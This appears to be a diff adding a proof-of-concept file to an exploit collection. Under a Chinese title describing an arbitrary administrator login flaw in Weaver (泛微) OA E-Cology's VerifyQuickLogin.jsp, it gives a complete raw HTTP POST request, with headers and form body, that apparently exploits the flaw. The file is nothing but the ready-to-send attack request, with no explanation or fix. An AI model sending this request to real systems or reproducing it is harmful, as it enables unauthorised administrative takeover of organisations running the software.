@@ -1,0 +1,11 @@
+# 泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞
+POST /mobile/plugin/VerifyQuickLogin.jsp?qhaeshs=7152635042877931521 HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Content-Length: 41
+Content-Type: application/x-www-form-urlencoded
+Host: www.byp-test.com:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
+qhaeshs: 7152635042877931521
+
+identifier=1&language=1&ipaddress=1.1.1.1
